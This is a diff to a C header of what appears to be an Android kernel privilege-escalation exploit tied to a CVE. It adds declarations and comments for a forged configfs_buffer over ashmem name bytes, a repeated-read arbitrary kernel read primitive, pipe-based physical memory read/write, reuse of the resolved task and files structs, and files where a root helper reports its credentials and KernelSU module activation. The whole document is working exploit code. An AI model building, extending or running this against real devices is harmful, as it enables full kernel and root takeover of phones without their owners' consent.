@@ -15,6 +15,7 @@
 #include <fcntl.h>
 #include <linux/futex.h>
 #include <linux/memfd.h>
+#include <poll.h>
 #include <pthread.h>
 #include <sched.h>
 #include <signal.h>
@@ -114,6 +115,8 @@ static inline int rmg_pin_gate_ready(void) {
 }
 #endif
 void durable_log_checkpoint(const char *stage);
+/* Panic-surviving trace writer (own file + immediate fsync); see util.c. */
+void rmg_diag(const char *fmt, ...);
 #ifndef KSNITCH_COLLISIONS
 #define KSNITCH_COLLISIONS 4
 #endif
@@ -140,7 +143,15 @@ void durable_log_checkpoint(const char *stage);
 #define SLIDE_FAKE_WAITER_PRIO FAKE_WAITER_PRIO
 #endif
 #define ASHMEM_NAME_PREFIX_LEN 11
+/* The u64 of "dev/ashm" - the first 8 bytes of ASHMEM_NAME_PREFIX "dev/ashmem/", which
+ * ashmem_open memcpy's into ashmem_area.name at open time. configfs_buffer.count sits at
+ * offset 0 of the forged buffer, i.e. exactly on those bytes, and the read plan relies on
+ * it as the high-water mark: ki_pos = COUNT - len makes count - ki_pos == len. */
 #define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL
+/* Size of the forged struct configfs_buffer (BTF sizeof = 0x80). The whole struct is
+ * covered so the region holding mutex / needs_read_fill / bin_buffer is zeroed, which is
+ * what keeps configfs_read_iter off the fill_read_buffer() and mutex-contended paths. */
+#define ASHMEM_BLOB_LEN 128
 
 #define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
 #define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
@@ -309,6 +320,9 @@ extern int root_child_done;
 extern char ashmem_path[256];
 extern uint32_t root_uid_before;
 extern uint32_t root_uid_after;
+/* Written by the root helper (su_daemon.c umh_main) with the credentials it really holds,
+ * so the exploit reports a measured uid instead of inferring 0 from a bound socket. */
+#define ROOT_CREDS_SENTINEL "/data/local/tmp/temp_su.creds"
 extern int cfi_attempts;
 extern int pipe_stage_attempts;
 extern int cfi_dirty_seen;
@@ -328,6 +342,10 @@ extern uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
 extern uintptr_t pipebuf_page_base;
 extern uintptr_t pipebuf_addr;
 extern int pipebuf_pipe_idx;
+/* Published by a successful pipe walk so the root stage can reuse the already-resolved
+ * self task_struct / files_struct instead of re-walking the task list. */
+extern uintptr_t pipe_walk_self_task;
+extern uintptr_t pipe_walk_self_files;
 extern char physrw_readback[64];
 extern char physrw_after_write[64];
 extern int physrw_read_ok;
@@ -460,6 +478,12 @@ ssize_t configfs_write_once(
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len);
 int is_direct_ptr(uintptr_t value);
 uint64_t kernel_read64(int fd, uintptr_t target);
+uint64_t kernel_read64_stable(int fd, uintptr_t target, int tries);
+
+/* Consecutive identical reads required by kernel_read64_stable() before a value
+ * is trusted. The AAR can hand back the memfd's previous contents when a name
+ * blob repeats, so a single read is not evidence of anything. */
+#define RMG_RD_TRIES 4
 ssize_t kernel_write_data(
     int fd, uintptr_t target, const void *data, size_t len);
 ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len);
@@ -492,6 +516,10 @@ uintptr_t page_to_direct(uintptr_t page);
 uintptr_t pipe_buf_ops_addr(void);
 int pipe_cache_matches(uint64_t slab_cache);
 int pipe_reclaim_cache_gate(int fd);
+void pipe_probe_cache_alignment(int fd);
+int pipe_walk_resolve_deterministic(int fd);
+ssize_t walk_read_kernel_u64(int fd, uintptr_t addr, uint64_t *out);
+ssize_t walk_read_kernel_bytes(int fd, uintptr_t addr, void *out, size_t len);
 int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab);
 int find_pipe_buffer(int fd, uintptr_t base);
 int pipe_phys_read(
@@ -508,6 +536,8 @@ int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len);
 int pipe_phys_write_data(
     int fd, uintptr_t direct_addr, const void *data, size_t len);
 int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
+int pipe_phys_read64(int fd, uintptr_t direct_addr, uint64_t *out);
+int pipe_phys_read32(int fd, uintptr_t direct_addr, uint32_t *out);
 int install_pipe_physrw(int fd);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 int prepare_p0_pipe_oracle(void);
@@ -701,6 +731,11 @@ static inline void ksu_mark_active_this_boot(void) {
  * shell-domain clients once SELinux re-enforces.
  */
 #define KSU_ACTIVATE_SIGNAL_PATH "/data/local/tmp/.cve43499-activate"
+/* Written by the root helper (fchowned to 2000:2000 so the shell-domain payload can read
+ * it) as it performs the KernelSU late-load + module activation from its own root context.
+ * "[activate] done" in this file is the success signal that does not depend on the daemon's
+ * unix socket, which proved unreliable on device. */
+#define ROOT_ACTIVATE_LOG_PATH "/data/local/tmp/ksu-activate.log"
 
 static inline void ksu_signal_activation(void) {
   unlink(KSU_ACTIVATE_SIGNAL_PATH);
